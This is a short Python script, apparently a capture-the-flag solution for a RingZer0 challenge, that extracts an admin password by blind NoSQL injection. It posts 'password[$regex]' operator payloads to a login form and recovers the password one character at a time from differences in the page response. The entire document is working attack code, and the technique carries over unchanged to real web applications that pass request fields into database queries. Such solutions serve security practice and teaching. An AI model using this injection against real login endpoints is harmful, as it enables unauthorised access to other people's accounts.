import requests
import string

url = 'http://challenges.ringzer0ctf.com:10309'

chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + '-'
found = '' 

while True:
    for char in chars:
        regex = f'^{found}{char}' # ^ est utilisé pour marquer le début d'une string
        payload = {
            'username': 'admin',
            'password[$regex]': regex
        }

        response = requests.post(url, data=payload)

        if "<h1>Welcome. Keep looking, the flag is not here.</h1>" in response.text:
            found += char
            print(f"Current match: {found}")
            break
    else:
        print(f"Final password: {found}")
        break